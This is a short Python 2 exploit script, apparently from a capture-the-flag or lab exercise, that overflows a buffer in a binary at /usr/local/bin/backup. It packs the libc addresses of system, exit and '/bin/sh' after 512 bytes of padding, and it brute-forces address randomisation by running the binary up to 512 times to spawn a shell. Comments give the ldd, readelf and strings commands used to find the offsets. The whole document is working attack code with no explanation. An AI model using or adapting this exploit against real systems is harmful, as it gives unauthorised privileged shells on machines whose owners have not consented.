from subprocess import call
import struct

libc_base_addr = 0xf7592000 # ldd /usr/local/bin/backup | grep libc.so.6

system_off = 0x0003a940		# Address of system (readelf -s /lib32/libc.so.6 | grep system)
exit_off = 0x0002e7b0		# Address of exit (readelf -s /lib32/libc.so.6 | grep exit)
arg_off = 0x15900b		# Address of /bin/sh (strings -a -t x /lib32/libc.so.6 | grep bin/sh)

system_addr = struct.pack("<I",libc_base_addr+system_off)
exit_addr = struct.pack("<I",libc_base_addr+exit_off)
arg_addr = struct.pack("<I",libc_base_addr+arg_off)

buf = "A" * 512
buf += system_addr
buf += exit_addr
buf += arg_addr

i = 0
while (i < 512):
	print "Try: %s" %i
	i += 1
	ret = call(["/usr/local/bin/backup", "aa", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", buf])